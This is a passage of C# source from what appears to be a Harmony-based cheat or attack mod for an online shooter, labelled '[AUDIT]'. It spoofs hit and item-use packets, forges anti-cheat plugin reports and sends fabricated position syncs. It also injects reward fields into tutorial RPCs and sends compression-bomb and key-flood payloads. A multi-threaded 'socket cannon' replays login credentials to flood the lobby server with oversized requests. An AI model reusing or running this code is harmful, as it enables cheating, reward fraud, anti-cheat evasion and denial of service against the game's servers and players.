        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                byte isRealMan = ParseByte(_useIsRealMan, 1);
                int robotUid = ParseInt(_useRobotUid, 0);
                byte slot = ParseByte(_useSlot, 0);
                Append("[AUDIT] Use spoof is_real_man=" + isRealMan + " robot_uid=" + robotUid + " slot=" + slot);
                conn.Use(isRealMan, robotUid, slot);
            }
            catch (Exception e)
            {
                Append("[AUDIT] Use spoof failed: " + e);
            }
        }

        private static void TriggerShootSpoof()
        {
            try
            {
                var conn = GetChannelConnection();
                var player = global::Level.Instance != null ? global::Level.Instance.GetPlayer() : null;
                if (conn == null || player == null)
                {
                    Append("[AUDIT] Shoot spoof failed: channel_connection 或 player 为空");
                    return;
                }

                Vector3 position = player.transform.position;
                Vector3 direction = (Camera.main != null) ? Camera.main.transform.forward : player.transform.forward;
                global::HitMessage hit = new global::HitMessage();
                hit.is_real_man = ParseByte(_shootIsRealMan, 1);
                hit.robot_uid = ParseInt(_shootRobotUid, 0);
                hit.uid = ParseInt(_shootTargetUid, 0);
                hit.distance = (short)ParseInt(_shootDistance, 0);
                hit.part = ParseInt(_shootPart, 0);
                hit.enc = ParseInt(_shootEnc, 0);
                hit.spread = ParseFloat(_shootSpread, 0f);
                hit.current_sight = ParseInt(_shootSight, 0);

                Append("[AUDIT] Shoot spoof target=" + hit.uid + " part=" + hit.part + " dist=" + hit.distance + " slot=" + ParseByte(_shootSlot, 0));
                conn.Shoot(position, direction, hit, ParseByte(_shootSlot, 0), _shootDoEffect, Vector3.zero);
            }
            catch (Exception e)
            {
                Append("[AUDIT] Shoot spoof failed: " + e);
            }
        }

        private static void TriggerPluginReport()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                byte uid = ParseByte(_pluginUid, 1);
                var type = (global::AssitToolType)ParseInt(_pluginType, 4);
                Append("[AUDIT] PluginReport uid=" + uid + " type=" + type + " check_ok=" + _pluginCheckOk);
                conn.PluginReport(uid, type, _pluginCheckOk);
            }
            catch (Exception e)
            {
                Append("[AUDIT] PluginReport failed: " + e);
            }
        }

        private static void TriggerPositionCheck()
        {
            try
            {
                var conn = GetChannelConnection();
                if (conn == null) return;
                byte uid = ParseByte(_positionUid, 1);
                int seq = ParseInt(_positionSeq, 0);
                byte tool = ParseByte(_positionTool, 4);
                Append("[AUDIT] Raw CM_PoistionCheck uid=" + uid + " seq=" + seq + " tool=" + tool);
                conn.BeginWrite();
                conn.WriteByte(170);
                conn.WriteByte(uid);
                conn.WriteInt(seq);
                conn.WriteByte(tool);
                conn.EndWrite();
            }
            catch (Exception e)
            {
                Append("[AUDIT] PositionCheck failed: " + e);
            }
        }

        private static void TriggerSyncSpoof()
        {
            try
            {
                var conn = GetChannelConnection();
                var player = global::Level.Instance != null ? global::Level.Instance.GetPlayer() : null;
                if (conn == null || player == null)
                {
                    Append("[AUDIT] Sync105 failed: channel_connection 或 player 为空");
                    return;
                }

                byte mask = ParseByte(_syncMask, 7);
                Vector3 position = player.transform.position + new Vector3(
                    ParseFloat(_syncOffsetX, 0f),
                    ParseFloat(_syncOffsetY, 0f),
                    ParseFloat(_syncOffsetZ, 0f));
                Vector3 look = (Camera.main != null)
                    ? new Vector3(Camera.main.transform.eulerAngles.x, Camera.main.transform.eulerAngles.y, 0f)
                    : new Vector3(player.transform.eulerAngles.x, player.transform.eulerAngles.y, 0f);

                Append("[AUDIT] Raw Sync105 is_real_man=" + ParseByte(_syncIsRealMan, 1) +
                       " robot_uid=" + ParseInt(_syncRobotUid, 0) +
                       " mask=" + mask +
                       " status=" + ParseByte(_syncStatus, 0) +
                       " pos=" + position);

                conn.BeginWrite();
                conn.WriteByte(105);
                conn.WriteByte(ParseByte(_syncIsRealMan, 1));
                conn.WriteInt(ParseInt(_syncRobotUid, 0));
                conn.WriteByte(ParseByte(_syncInterval, 255));
                conn.WriteByte(mask);
                if ((mask & 1) != 0)
                {
                    conn.WriteByte(ParseByte(_syncStatus, 0));
                }
                if ((mask & 8) != 0)
                {
                    conn.WriteShort(0);
                }
                if ((mask & 4) != 0)
                {
                    global::ConnectionDef.WriteCharacterPosition(conn.Stream, position);
                }
                if ((mask & 2) != 0)
                {
                    global::ConnectionDef.WriteCharacterEulerAngles(conn.Stream, look);
                }
                conn.EndWrite();
            }
            catch (Exception e)
            {
                Append("[AUDIT] Sync105 failed: " + e);
            }
        }

        private static void QueuePresetTutorialCompression()
        {
            int repeat = Mathf.Clamp(ParseInt(_rawRepeatCount, 65536), 1, 1048576);
            char ch = FirstOrDefault(_rawRepeatChar, 'A');
            _rawFunc = "player_tutorial_finish";
            _rawBody = "tutorial\n16775544\npad\n" + new string(ch, repeat) + "\n";
            QueueRawTextRpc(_rawFunc, _rawBody, "preset=tutorial-compression");
        }

        private static void QueuePresetTutorialKeyFlood()
        {
            int keyCount = Mathf.Clamp(ParseInt(_rawKeyCount, 128), 1, 4096);
            int chunkSize = Mathf.Clamp(ParseInt(_rawChunkSize, 64), 1, 2048);
            char ch = FirstOrDefault(_rawRepeatChar, 'A');
            StringBuilder sb = new StringBuilder(keyCount * (chunkSize + 16));
            sb.Append("tutorial\n16775544\n");
            for (int i = 0; i < keyCount; i++)
            {
                sb.Append("k").Append(i.ToString("D4")).Append("\n");
                sb.Append(new string(ch, chunkSize)).Append("\n");
            }
            _rawFunc = "player_tutorial_finish";
            _rawBody = sb.ToString();
            QueueRawTextRpc(_rawFunc, _rawBody, "preset=tutorial-keyflood");
        }

        private static void QueuePresetTutorialSmuggle()
        {
            int chunkSize = Mathf.Clamp(ParseInt(_rawChunkSize, 64), 1, 4096);
            char ch = FirstOrDefault(_rawRepeatChar, 'A');
            string cid = GetCurrentCharacterId();
            _rawFunc = "player_tutorial_finish";
            _rawBody = "tutorial\n16775544\n" +
                       "pad\n" + new string(ch, chunkSize) + "\n" +
                       "playerId\n" + cid + "\n" +
                       "rewardType\n9999\n" +
                       "checkinId\n1\n";
            QueueRawTextRpc(_rawFunc, _rawBody, "preset=tutorial-smuggle");
        }

        private static void QueuePresetLongFunc()
        {
            int repeat = Mathf.Clamp(ParseInt(_rawRepeatCount, 65536), 1, 262144);
            char ch = FirstOrDefault(_rawRepeatChar, 'Q');
            _rawFunc = new string(ch, repeat);
            _rawBody = "k\nv\n";
            QueueRawTextRpc(_rawFunc, _rawBody, "preset=long-func len=" + repeat);
        }

        private static void QueuePresetLongFuncSweep()
        {
            char ch = FirstOrDefault(_rawRepeatChar, 'Q');
            int[] lengths = ParseLengthSweep(_rawLongFuncSweep, new[] { 512, 1024, 1536, 2048, 2560, 3072, 3584, 4096 });
            Append("[RAW:PLAN] long-func-sweep count=" + lengths.Length + " lengths=" + string.Join(",", lengths.Select(v => v.ToString()).ToArray()));
            for (int i = 0; i < lengths.Length; i++)
            {
                int repeat = Mathf.Clamp(lengths[i], 1, 262144);
                string func = new string(ch, repeat);
                QueueRawTextRpc(func, "k\nv\n", "preset=long-func-sweep step=" + (i + 1) + "/" + lengths.Length + " len=" + repeat);
            }
        }

        private static void TriggerLongFuncSocketCannon()
        {
            if (Interlocked.CompareExchange(ref _rawSocketWorkers, 0, 0) > 0)
            {
                Append("[RAW:CANNON] 已在运行，当前 workers=" + _rawSocketWorkers);
                return;
            }

            int workerCount = Mathf.Clamp(ParseInt(_rawSocketBurstCount, 4), 1, 16);
            int recvMs = Mathf.Clamp(ParseInt(_rawSocketRecvMs, 1500), 250, 10000);
            int holdMs = Mathf.Clamp(ParseInt(_rawSocketHoldMs, 2500), 0, 15000);
            int[] lengths = ParseLengthSweep(_rawLongFuncSweep, new[] { 512 });
            int funcLen = (lengths.Length > 0) ? lengths[0] : 512;
            char ch = FirstOrDefault(_rawRepeatChar, 'A');
            string func = new string(ch, funcLen);
            string host;
            int port;
            byte[] authPayload;
            byte[] rpcPayload;
            string error;

            if (!TryBuildStandaloneAttackArtifacts(func, "k\nv\n", out host, out port, out authPayload, out rpcPayload, out error))
            {
                Append("[RAW:CANNON] 启动失败: " + error);
                return;
            }

            Append("[RAW:CANNON-PLAN] workers=" + workerCount +
                   " host=" + host +
                   " port=" + port +
                   " funcLen=" + funcLen +
                   " recvMs=" + recvMs +
                   " holdMs=" + holdMs);

            for (int i = 0; i < workerCount; i++)
            {
                int workerIndex = i + 1;
                Interlocked.Increment(ref _rawSocketWorkers);
                ThreadPool.QueueUserWorkItem(delegate
                {
                    try
                    {
                        FireStandaloneLongFuncSocket(host, port, authPayload, rpcPayload, workerIndex, workerCount, funcLen, recvMs, holdMs);
                    }
                    catch (Exception ex)
                    {
                        Append("[RAW:CANNON-ERR] worker=" + workerIndex + "/" + workerCount + " ex=" + ex.GetType().Name + ": " + ex.Message);
                    }
                    finally
                    {
                        int remain = Interlocked.Decrement(ref _rawSocketWorkers);
                        if (remain == 0)
                        {
                            Append("[RAW:CANNON-DONE] workers=" + workerCount + " funcLen=" + funcLen);
                        }
                    }
                });
            }
        }

        private static void QueueRawTextRpc(string func, string rawBody, string note)
        {
            RawRequest item = new RawRequest(func, rawBody, note);
            _rawPendingQueue.Enqueue(item);
            Append("[RAW:QUEUE] note=" + item.Note + " funcLen=" + item.Func.Length + " bodyLen=" + item.Body.Length + " pending=" + _rawPendingQueue.Count);
            TryFlushQueuedRawRpc();
        }

        private static void TryFlushQueuedRawRpc()
        {
            if (_rawPendingQueue.Count == 0)
            {
                return;
            }
            if (_rawArmPending || _rawWriteOverrideBody != null || !string.IsNullOrEmpty(_rawInFlightNote))
            {
                return;
            }
            var conn = GetLobbyConnectionSilent();
            if (conn == null)
            {
                return;
            }
            try
            {
                RawRequest item = _rawPendingQueue.Peek();
                if (string.IsNullOrEmpty(item.Func))
                {
                    Append("[RAW:SEND] 失败：func 为空");
                    _rawPendingQueue.Dequeue();
                    return;
                }
                var callback = new global::LobbyConnection.RpcCallback(OnRawSendResult);
                _rawArmPending = true;
                _rawArmCallback = callback;
                _rawArmFunc = item.Func;
                _rawArmBody = item.Body;
                _rawArmNote = item.Note;
                _rawInFlightNote = item.Note;
                _rawInFlightFuncLen = item.Func.Length;
                _rawInFlightBodyLen = item.Body.Length;
                _rawInFlightAtUtc = DateTime.UtcNow;
                _rawInFlightTimeoutLogged = false;

                var marker = new Dictionary<string, string> { { RawMarkerKey, item.Note ?? "raw" } };
                conn.AddTextRpc(item.Func, callback, marker);
                Append("[RAW:ENQUEUE] note=" + item.Note + " funcLen=" + item.Func.Length + " bodyLen=" + item.Body.Length + " remain=" + (_rawPendingQueue.Count - 1));
                _rawPendingQueue.Dequeue();
            }
            catch (Exception e)
            {
                _rawArmPending = false;
                _rawArmCallback = null;
                _rawArmFunc = string.Empty;
                _rawArmBody = string.Empty;
                _rawArmNote = string.Empty;
                ClearRawInFlight();
                Append("[RAW:SEND] 异常: " + e);
            }
        }

        private static void OnRawSendResult(string data)
        {
            string note = _rawInFlightNote;
            int funcLen = _rawInFlightFuncLen;
            int bodyLen = _rawInFlightBodyLen;
            double elapsedMs = (_rawInFlightAtUtc == DateTime.MinValue) ? 0.0 : (DateTime.UtcNow - _rawInFlightAtUtc).TotalMilliseconds;
            ClearRawInFlight();
            if (IsLuaError(data, out var msg))
            {
                Append("[RAW RESULT:ERROR] note=" + note + " funcLen=" + funcLen + " bodyLen=" + bodyLen + " elapsedMs=" + elapsedMs.ToString("F0") + "\n  error: " + msg);
            }
            else
            {
                var pretty = TrimForLog(data);
                Append("[RAW RESULT:OK] note=" + note + " funcLen=" + funcLen + " bodyLen=" + bodyLen + " elapsedMs=" + elapsedMs.ToString("F0") + "\n" + IndentBlock("data", pretty));
            }
            TryFlushQueuedRawRpc();
        }

        private static void TickRawInFlight()
        {
            if (string.IsNullOrEmpty(_rawInFlightNote) || _rawInFlightTimeoutLogged)
            {
                return;
            }
            double elapsedSeconds = (DateTime.UtcNow - _rawInFlightAtUtc).TotalSeconds;
            if (elapsedSeconds < RawInFlightTimeoutSeconds)
            {
                return;
            }
            _rawInFlightTimeoutLogged = true;
            Append("[RAW:STALL] note=" + _rawInFlightNote + " funcLen=" + _rawInFlightFuncLen + " bodyLen=" + _rawInFlightBodyLen + " wait=" + elapsedSeconds.ToString("F1") + "s pending=" + _rawPendingQueue.Count);
        }

        private static void ClearRawInFlight()
        {
            _rawInFlightNote = string.Empty;
            _rawInFlightFuncLen = 0;
            _rawInFlightBodyLen = 0;
            _rawInFlightAtUtc = DateTime.MinValue;
            _rawInFlightTimeoutLogged = false;
        }

        private static int[] ParseLengthSweep(string text, int[] fallback)
        {
            List<int> values = new List<int>();
            string[] parts = (text ?? string.Empty).Split(new[] { ',', ';', '|', ' ', '\t', '\r', '\n' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < parts.Length; i++)
            {
                int parsed;
                if (int.TryParse(parts[i], out parsed))
                {
                    parsed = Mathf.Clamp(parsed, 1, 262144);
                    if (!values.Contains(parsed))
                    {
                        values.Add(parsed);
                    }
                }
            }
            if (values.Count == 0 && fallback != null)
            {
                for (int i = 0; i < fallback.Length; i++)
                {
                    int parsed = Mathf.Clamp(fallback[i], 1, 262144);
                    if (!values.Contains(parsed))
                    {
                        values.Add(parsed);
                    }
                }
            }
            values.Sort();
            return values.ToArray();
        }

        private static bool TryBuildStandaloneAttackArtifacts(string func, string body, out string host, out int port, out byte[] authPayload, out byte[] rpcPayload, out string error)
        {
            host = string.Empty;
            port = 0;
            authPayload = null;
            rpcPayload = null;
            error = string.Empty;
            try
            {
                host = GetCurrentLobbyHost();
                port = GetCurrentLobbyPort();
                if (string.IsNullOrEmpty(host) || port <= 0)
                {
                    error = "无法解析 lobby host/port";
                    return false;
                }
                authPayload = BuildCurrentLoginPayload();
                rpcPayload = BuildTextRpcPayload(func ?? string.Empty, body ?? string.Empty, 1);
                return true;
            }
            catch (Exception ex)
            {
                error = ex.GetType().Name + ": " + ex.Message;
                return false;
            }
        }

        private static string GetCurrentLobbyHost()
        {
            var conn = GetLobbyConnectionSilent();
            if (conn != null && !string.IsNullOrEmpty(conn.real_login_ip))
            {
                return conn.real_login_ip;
            }
            return global::StartConfig.ip ?? string.Empty;
        }

        private static int GetCurrentLobbyPort()
        {
            return global::StartConfig.port;
        }

        private static byte[] BuildCurrentLoginPayload()
        {
            using (MemoryStream ms = new MemoryStream(512))
            {
                WritePayloadString(ms, global::FileSystem.Instance != null ? global::FileSystem.Instance.gVersion : string.Empty);
                WritePayloadBool(ms, true);
                WritePayloadByte(ms, (byte)(global::StartConfig.platform + 2));

                switch (global::StartConfig.platform)
                {
                    case 0:
                    {
                        var conn = GetLobbyConnectionSilent();
                        WritePayloadString(ms, conn != null ? conn.login_name : string.Empty);
                        WritePayloadString(ms, conn != null ? conn.login_pass : string.Empty);
                        break;
                    }
                    case 1:
                    {
                        string accountId = GetWebApiValue("accountid", "728707581");
                        int num = ParseInt(accountId, 728707581);
                        WritePayloadInt(ms, num);
                        WritePayloadString(ms, GetWebApiValue("session", string.Empty));
                        WritePayloadString(ms, num.ToString());
                        WritePayloadString(ms, GetWebApiValue("tad", "none"));
                        break;
                    }
                    case 2:
                    {
                        WritePayloadString(ms, GetWebApiValue("username", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("time", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("cm", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("site", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("flag", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("serverid", string.Empty));
                        break;
                    }
                    case 3:
                    {
                        WritePayloadString(ms, GetWebApiValue("userid", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("username", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("time", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("flag", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("serverid", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("isadult", string.Empty));
                        break;
                    }
                    case 4:
                    {
                        string openid = GetWebApiValue("openid", global::GlobalStatic.openid);
                        string openkey = GetWebApiValue("openkey", global::GlobalStatic.openkey);
                        string pf = GetWebApiValue("pf", global::GlobalStatic.pf);
                        string baseUrl = "/v3/user/get_info?appid=" + global::GlobalStatic.appid +
                                         "&openid=" + openid +
                                         "&openkey=" + openkey +
                                         "&pf=" + pf;
                        string signedUrl = baseUrl + "&sig=" + ComputeTencentSig(global::GlobalStatic.appkey, baseUrl);
                        WritePayloadString(ms, signedUrl);
                        WritePayloadString(ms, openid);
                        WritePayloadString(ms, openkey);
                        WritePayloadString(ms, pf);
                        WritePayloadInt(ms, 1);
                        break;
                    }
                    case 5:
                    {
                        WritePayloadString(ms, GetWebApiValue("account", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("session", string.Empty));
                        WritePayloadString(ms, GetWebApiValue("pf", string.Empty));
                        break;
                    }
                    default:
                        break;
                }

                return ms.ToArray();
            }
        }

        private static string GetWebApiValue(string key, string fallback)
        {
            string value = fallback ?? string.Empty;
            var app = global::GameApp.Instance;
            if (app == null || app.Web_API_InfoList == null)
            {
                return value;
            }
            try
            {
                if (app.Web_API_InfoList.TryGetValue(key, out value))
                {
                    return value ?? string.Empty;
                }
            }
            catch
            {
            }
            try
            {
                if (app.Web_API_InfoList.ContainsKey(key))
                {
                    return app.Web_API_InfoList[key] ?? string.Empty;
                }
            }
            catch
            {
            }
            return value ?? string.Empty;
        }

        private static string ComputeTencentSig(string appkey, string url)
        {
            int split = (url ?? string.Empty).IndexOf('?');
            if (split < 0)
            {
                return string.Empty;
            }
            string encodedPath = EncodeTencentUrl(url.Substring(0, split));
            string query = url.Substring(split + 1);
            Dictionary<string, string> map = new Dictionary<string, string>();
            string[] args = query.Split(new[] { '&' }, StringSplitOptions.RemoveEmptyEntries);
            for (int i = 0; i < args.Length; i++)
            {
                int pos = args[i].IndexOf('=');
                if (pos <= 0) continue;
                map[args[i].Substring(0, pos)] = args[i].Substring(pos + 1);
            }
            string canonical = string.Join("&", map.OrderBy(kv => kv.Key).Select(kv => kv.Key + "=" + kv.Value).ToArray());
            string plain = "GET&" + encodedPath + "&" + EncodeTencentUrl(canonical);
            using (HMACSHA1 hmac = new HMACSHA1(Encoding.ASCII.GetBytes((appkey ?? string.Empty) + "&")))
            {
                string base64 = Convert.ToBase64String(hmac.ComputeHash(Encoding.ASCII.GetBytes(plain)));
                return EncodeTencentUrl(base64);
            }
        }

        private static string EncodeTencentUrl(string url)
        {
            return Regex.Replace(url ?? string.Empty, "[^0-9a-zA-Z\\-._~!()*]", delegate(Match match)
            {
                byte[] bytes = Encoding.ASCII.GetBytes(match.Value);
                StringBuilder sb = new StringBuilder();
                for (int i = 0; i < bytes.Length; i++)
                {
                    sb.Append('%').Append(bytes[i].ToString("X2"));
                }
                return sb.ToString();
            });
        }

        private static byte[] BuildTextRpcPayload(string func, string body, int requestId)
        {
            using (MemoryStream ms = new MemoryStream(1024))
            {
                WritePayloadByte(ms, 0);
                WritePayloadInt(ms, requestId);
                WritePayloadString(ms, func);
                WritePayloadCompressString(ms, body);
                return ms.ToArray();
            }
        }

        private static void FireStandaloneLongFuncSocket(string host, int port, byte[] authPayload, byte[] rpcPayload, int workerIndex, int workerCount, int funcLen, int recvMs, int holdMs)
        {
            using (Socket socket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp))
            {
                socket.NoDelay = true;
                socket.SendTimeout = recvMs;
                socket.ReceiveTimeout = recvMs;
                socket.Connect(host, port);

                XORNetworkEncoder encoder = new XORNetworkEncoder();
                encoder.Reset();
                byte clientKey = encoder.GetKey();
                SendEncodedFrame(socket, encoder, BuildHandshakePayload(clientKey));

                byte[] hello = ReceiveFrame(socket, encoder);
                if (hello == null || hello.Length < 9)
                {
                    Append("[RAW:CANNON-HELLO] worker=" + workerIndex + "/" + workerCount + " invalid len=" + ((hello == null) ? -1 : hello.Length));
                    return;
                }

                byte serverKey = hello[0];
                encoder.SetKey(serverKey);
                encoder.UpdateKey();
                Append("[RAW:CANNON-HELLO] worker=" + workerIndex + "/" + workerCount + " clientKey=" + clientKey + " serverKey=" + serverKey);

                SendEncodedFrame(socket, encoder, authPayload);
                byte[] authReply = ReceiveFrame(socket, encoder);
                if (authReply == null || authReply.Length < 16)
                {
                    Append("[RAW:CANNON-AUTH] worker=" + workerIndex + "/" + workerCount + " fail len=" + ((authReply == null) ? -1 : authReply.Length));
                    return;
                }

                ulong uid = ReadUInt64(authReply, 0);
                ulong userId = ReadUInt64(authReply, 8);
                Append("[RAW:CANNON-AUTH] worker=" + workerIndex + "/" + workerCount + " uid=" + uid + " userId=" + userId + " replyLen=" + authReply.Length);
                if (uid == 0UL || userId == 0UL)
                {
                    return;
                }

                SendEncodedFrame(socket, encoder, rpcPayload);
                Append("[RAW:CANNON-FIRE] worker=" + workerIndex + "/" + workerCount + " funcLen=" + funcLen + " payloadLen=" + rpcPayload.Length);

                bool timeout;
                bool closed;
                byte[] reply = TryReceiveFrame(socket, encoder, recvMs, out timeout, out closed);
                if (reply != null)
                {
                    Append("[RAW:CANNON-RSP] worker=" + workerIndex + "/" + workerCount + " len=" + reply.Length + " preview=" + TrimForLog(Encoding.UTF8.GetString(reply)));
                }
                else if (closed)
                {
                    Append("[RAW:CANNON-CLOSE] worker=" + workerIndex + "/" + workerCount + " 服务端主动关闭");
                }
                else if (timeout)
                {
                    Append("[RAW:CANNON-WAIT] worker=" + workerIndex + "/" + workerCount + " funcLen=" + funcLen + " timeout=" + recvMs + "ms");
                }

                if (holdMs > 0)
                {
                    Thread.Sleep(holdMs);
                }
            }
        }

        private static byte[] BuildHandshakePayload(byte clientKey)
        {
            byte[] payload = new byte[9];
            payload[0] = clientKey;
            return payload;
        }

        private static void SendEncodedFrame(Socket socket, XORNetworkEncoder encoder, byte[] payload)
        {
            byte[] body = payload ?? new byte[0];
            byte[] encoded = new byte[body.Length];
            if (body.Length > 0)
            {
                Buffer.BlockCopy(body, 0, encoded, 0, body.Length);
                encoder.Encode(encoded, 0, encoded.Length);
            }
            byte[] header = EncodeHeader(encoded.Length);
            SendAll(socket, header, 0, header.Length);
            if (encoded.Length > 0)
            {
                SendAll(socket, encoded, 0, encoded.Length);
            }
        }

        private static byte[] ReceiveFrame(Socket socket, XORNetworkEncoder encoder)
        {
            bool timeout;
            bool closed;
            byte[] frame = TryReceiveFrame(socket, encoder, socket.ReceiveTimeout, out timeout, out closed);
            if (frame == null)
            {
                if (closed) throw new IOException("remote closed");
                if (timeout) throw new IOException("recv timeout");
            }
            return frame;
        }

        private static byte[] TryReceiveFrame(Socket socket, XORNetworkEncoder encoder, int timeoutMs, out bool timeout, out bool closed)
        {
            timeout = false;
            closed = false;
            int prevTimeout = socket.ReceiveTimeout;
            socket.ReceiveTimeout = timeoutMs;
            try
            {
                byte[] header = new byte[4];
                int headerLen = 0;
                while (headerLen < 4)
                {
                    int got = socket.Receive(header, headerLen, 1, SocketFlags.None);
                    if (got == 0)
                    {
                        closed = true;
                        return null;
                    }
                    headerLen += got;
                    if ((header[headerLen - 1] & 128) == 0)
                    {
                        break;
                    }
                }
                int payloadLen = DecodeHeader(header, headerLen);
                byte[] payload = new byte[payloadLen];
                if (payloadLen > 0)
                {
                    ReceiveExact(socket, payload, 0, payloadLen);
                    encoder.Decode(payload, 0, payloadLen);
                }
                return payload;
            }
            catch (SocketException ex)
            {
                if (ex.SocketErrorCode == SocketError.TimedOut || ex.SocketErrorCode == SocketError.WouldBlock)
                {
                    timeout = true;
                    return null;
                }
                throw;
            }
            finally
            {
                socket.ReceiveTimeout = prevTimeout;
            }
        }

        private static void SendAll(Socket socket, byte[] buffer, int offset, int length)
        {
            int sent = 0;
            while (sent < length)
            {
                int num = socket.Send(buffer, offset + sent, length - sent, SocketFlags.None);
                if (num <= 0)
                {
                    throw new IOException("socket send returned " + num);
                }
                sent += num;
            }
        }

        private static void ReceiveExact(Socket socket, byte[] buffer, int offset, int length)
        {
            int read = 0;
            while (read < length)
            {
                int num = socket.Receive(buffer, offset + read, length - read, SocketFlags.None);
                if (num <= 0)
                {
                    throw new IOException("socket receive returned " + num);
                }
                read += num;
            }
        }

        private static byte[] EncodeHeader(int length)
        {
            if (length < 0 || length > 268435455)
            {
                throw new ArgumentOutOfRangeException("length");
            }
            List<byte> header = new List<byte>(4);
            int n = length;
            do
            {
                byte b = (byte)(n & 127);
                n >>= 7;
                if (n > 0)
                {
                    b |= 128;
                }
                header.Add(b);
            }
            while (n > 0 && header.Count < 4);
            return header.ToArray();
        }

        private static int DecodeHeader(byte[] header, int headerLen)
        {
            int n = 0;
            for (int i = 0; i < headerLen; i++)
            {
                n |= (header[i] & 127) << (7 * i);
                if ((header[i] & 128) == 0)
                {
                    return n;
                }
            }
            throw new IOException("invalid header");
        }

        private static ulong ReadUInt64(byte[] data, int offset)
        {
            if (data == null || data.Length < offset + 8)
            {
                return 0UL;
            }
            return BitConverter.ToUInt64(data, offset);
        }

        private static void WritePayloadByte(Stream stream, byte value)
        {
            stream.WriteByte(value);
        }

        private static void WritePayloadBool(Stream stream, bool value)
        {
            byte[] bytes = BitConverter.GetBytes(value);
            stream.Write(bytes, 0, bytes.Length);
        }

        private static void WritePayloadInt(Stream stream, int value)
        {
            stream.WriteByte((byte)(value & 255));
            stream.WriteByte((byte)((value >> 8) & 255));
            stream.WriteByte((byte)((value >> 16) & 255));
            stream.WriteByte((byte)((value >> 24) & 255));
        }

        private static void WritePayloadString(Stream stream, string value)
        {
            byte[] bytes = Encoding.UTF8.GetBytes(value ?? string.Empty);
            WritePayloadInt(stream, bytes.Length);
            if (bytes.Length > 0)
            {
                stream.Write(bytes, 0, bytes.Length);
            }
        }

        private static void WritePayloadCompressString(Stream stream, string value)
        {
            if (string.IsNullOrEmpty(value))
            {
                return;
            }
            byte[] bytes = Encoding.UTF8.GetBytes(value);
            int maxLen = global::DllManager.Lz4CompressSize(bytes.Length);
            byte[] compressed = new byte[maxLen];
            int actual = global::DllManager.Lz4CompressData(ref bytes[0], ref compressed[0], bytes.Length, maxLen);
            if (actual > 0)
            {
                WritePayloadInt(stream, actual);
                stream.Write(compressed, 0, actual);
            }
        }

        private static global::LobbyConnection GetLobbyConnection()
        {
            var app = global::GameApp.Instance;
            var conn = (app != null) ? app.lobby_connection : null;
            if (conn == null)
            {
                Append("[AUDIT] lobby_connection 为空");
            }
            return conn;
        }

        private static global::LobbyConnection GetLobbyConnectionSilent()
        {
            var app = global::GameApp.Instance;
            return (app != null) ? app.lobby_connection : null;
        }

        private static global::ChannelConnection GetChannelConnection()
        {
            var app = global::GameApp.Instance;
            var conn = (app != null) ? app.channel_connection : null;
            if (conn == null)
            {
                Append("[AUDIT] channel_connection 为空");
            }
            return conn;
        }

        private static byte[] BuildBlob(int size, byte fill)
        {
            if (size <= 0)
            {
                return new byte[0];
            }
            byte[] data = new byte[size];
            for (int i = 0; i < data.Length; i++)
            {
                data[i] = fill;
            }
            return data;
        }

        private static int ParseInt(string text, int fallback)
        {
            int value;
            return int.TryParse(text, out value) ? value : fallback;
        }

        private static uint ParseUInt(string text, uint fallback)
        {
            uint value;
            return uint.TryParse(text, out value) ? value : fallback;
        }

        private static byte ParseByte(string text, byte fallback)
        {
            byte value;
            return byte.TryParse(text, out value) ? value : fallback;
        }

        private static float ParseFloat(string text, float fallback)
        {
            float value;
            return float.TryParse(text, out value) ? value : fallback;
        }

        private static char FirstOrDefault(string text, char fallback)
        {
            return string.IsNullOrEmpty(text) ? fallback : text[0];
        }

        private static string GetCurrentCharacterId()
        {
            try
            {
                if (!string.IsNullOrEmpty(global::GlobalStatic.id))
                {
                    return global::GlobalStatic.id;
                }
            }
            catch
            {
            }
            return "0";
        }

        // ====== 判错 & 美化 ======
        private static bool IsLuaError(string data, out string err)
        {
            err = null;
            try
            {
                var L = new LuaState(null);
                L.DoString(data);
                var e = L["error"];
                if (e != null && !string.IsNullOrEmpty(e.ToString()))
                {
                    // 你的工程里 ValueByThisKey 扩展可能名为 valueByThisKey，这里保留原名
                    err = e.ToString().valueByThisKey();
                    return true;
                }
            }
            catch { /* ignore */ }
            return false;
        }
        // ====== 调用者抓取（从调用栈里挑出第一个“业务帧”） ======
        private static string CaptureCaller()
        {
            try
            {
                var st = new StackTrace(skipFrames: 1, fNeedFileInfo: true); // 跳过本方法自己
                for (int i = 0; i < st.FrameCount; i++)
                {
                    var f = st.GetFrame(i);
                    var m = f.GetMethod();
                    if (m == null) continue;
                    var dt = m.DeclaringType;
                    var tn = dt != null ? dt.FullName : "";

                    // 过滤噪声：系统/Unity/Harmony/你的 UI 和 Patch/LobbyConnection 自身
                    if (string.IsNullOrEmpty(tn)) continue;
                    if (tn.StartsWith("System.", StringComparison.Ordinal)) continue;
                    if (tn.StartsWith("UnityEngine.", StringComparison.Ordinal)) continue;
                    if (tn.StartsWith("UnityEditor.", StringComparison.Ordinal)) continue;
                    if (tn.StartsWith("Harmony", StringComparison.Ordinal)) continue;
                    if (tn.StartsWith("ASWDEBUG.UI", StringComparison.Ordinal)) continue;
                    if (tn.StartsWith("ASWDEBUG.Patch", StringComparison.Ordinal)) continue;
                    if (tn.Contains("LobbyConnection")) continue; // 忽略被调用方自身

                    // 命中了“业务帧”
                    var file = f.GetFileName();
                    var line = f.GetFileLineNumber();
                    var where = (!string.IsNullOrEmpty(file) && line > 0)
                                ? $" @ {System.IO.Path.GetFileName(file)}:{line}"
                                : "";
                    return ShortMethod(m) + where;
                }
            }
            catch { /* 忽略 */ }
            return "(unknown caller)";
        }

        private static string ShortMethod(System.Reflection.MethodBase m)
        {
            try
            {
                var dt = m.DeclaringType;
                var typeName = dt != null ? dt.FullName : "(no-type)";
                var ps = m.GetParameters();
